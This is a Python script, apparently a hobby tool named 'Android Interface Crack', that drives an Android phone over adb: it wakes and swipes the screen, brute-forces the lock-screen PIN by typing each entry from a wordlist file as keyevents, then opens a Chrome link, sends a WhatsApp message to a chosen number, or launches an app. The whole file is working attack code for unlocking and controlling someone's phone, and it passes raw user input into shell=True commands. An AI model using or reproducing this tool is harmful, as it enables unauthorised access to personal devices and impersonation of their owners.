import time
import os
#from ppadb.client import Client as AdbClient
import subprocess as sp

class Main:
	def __init__(self):
		#print('constructuor')
		#display banner
		self.banner()
		self.path = input("Enter Pin File : ")

	def banner(self):
		print(' ---------------------------------------------')
		print('|               Custom  Script               |')
		print('|         Control Over The Android           |')
		print(' ___           _     ____     ____            ')
		print('/    |    |   / \   |    \   /    \ |        |')
		print('\__  |____|  /___\  |     | |      ||        |')
		print('   \ |    | /     \ |     | |      | \  /\  / ')
		print('___/ |    |/       \|____/   \____/   \/  \/  ')
		print('                                              ')
		print(' ---------------------------------------------')
		print('Versions : 1.0.2')
		print('Name : Android Interface Crack')
		print('Author   : Ravi Panchal')
		print('\n')

	def attackList(self):
		print('\n')
		print('----Attack List----')
		print('1. Chrome With Link')
		print('2. send msg on whatsapp')
		print('3. Open App With Package')
		print('\n')
		atk = input("Choose Attack : ")
		return atk

	def crackPin(self):
		oFile = open(f'{self.path}','r')
		lines = oFile.readlines()

		#pwdList = ["1111","1212","1316","4444"]
		for i in lines:
			#print(i)
			for j in range(len(str(i))):
				#print(j)
				if i[j] == '\n':
					continue
				sp.call(f"adb shell input keyevent {(int(i[j])+7)}",shell=True)
			#print(str(i))
			sp.call("adb shell input keyevent 66",shell=True)
	def chrome(self):
		time.sleep(1)
		#lock or unlock the phone
		#sp.call("adb shell input keyevent 26",shell=True)
		#time.sleep(0.5)
		#swipe the screen
		link = input("Enter A link to open : ")
		cmd = [
			"keyevent 26",
			"swipe 407 1211 378 85",
			"",
			#"tap 360 1150",
			"keyevent 64",
			"tap 600 90",
			"tap 100 90",
			"tap 340 440",
			f"text {link}",
			"keyevent 66"]
		wait = [0.5,0,0,2,0,0,0.3,0,0]

		#task list
		task  = [
			"Power On",
			"Unlock Phone",
			"Cracking Pin",
			#"Opening Menu",
			"Open Browser",
			"Get All Tabs",
			"Enter New Tab",
			"Access Search",
			"Enter Inputs",
			"All Checks"]

		for i in range(len(cmd)):
			if i==2:
				self.crackPin()
				pass
			else:
				sp.call(f"adb shell input {cmd[i]}",shell=True)
				time.sleep(wait[i])
			print(f"Task : {i+1} {task[i]} : Done")

	def whatsapp(self):
		time.sleep(1)
		num = input("Enter A Number : ")
		msg = input("Enter A Message : ")
		cmd = [
			"keyevent 26",
                        "swipe 407 1211 378 85",
			"For Crack The PIN",
			"FOR OPEN WHATSAPP",
			"tap 605 89",
			f"text {num}",
			"tap 375 200",
			f"text {msg}",
			"keyevent 22",
			"keyevent 22",
			"keyevent 66"
			]
		wait = [0.5,0.2,0.4,2,0.2,0.2,0.5,0.2,0,0,0]

		task = [
                        "Power On",
                        "Unlock Phone",
                        "Cracking Pin",
                        "Opening WhatsApp",
                        "Opening Search",
                        "Enter Search Value",
                        "Clicking on Result",
                        "Entering Message",
                        "Move Forward",
                        "Move Forware",
			"Send Message"]

		for i in range(len(cmd)):
			if i==2:
				self.crackPin()
			elif i == 3:
				sp.call("adb shell monkey -p com.whatsapp -c android.intent.category.LAUNCHER 1",shell=True)
			else:
				sp.call(f"adb shell input {cmd[i]}",shell=True) 
				time.sleep(wait[i])
			print(f"Task : {i+1} {task[i]} : Done")

	def openApp(self):
		time.sleep(1)
		pkg = input('Enter Package Name : ')
		cmd = [
                        "keyevent 26",
                        "swipe 407 1211 378 85",
                        "For Crack The PIN",
                        "FOR OPEN PACKAGE",
                        ]
		wait = [0.5,0.2,0.4,2]
		task =["Power On","Unlock Phone","Cracking Pin","Open Application"]
		for i in range(len(cmd)):
                        if i==2:
                                self.crackPin()
                        elif i == 3:
                                sp.call(f"adb shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1",shell=True)
                        else:
                                sp.call(f"adb shell input {cmd[i]}",shell=True) 
                                time.sleep(wait[i])
                        print(f"Task : {i+1} {task[i]} : Done")

	def run(self):
		atk = self.attackList()
		#print(atk)
		print('Attack Starting .... \n')
		if atk == "1":
			self.chrome()
		elif atk == "2":
			self.whatsapp()
		elif atk == "3":
			self.openApp()
		#sp.call("adb devices",shell=True)
main = Main()
main.run()
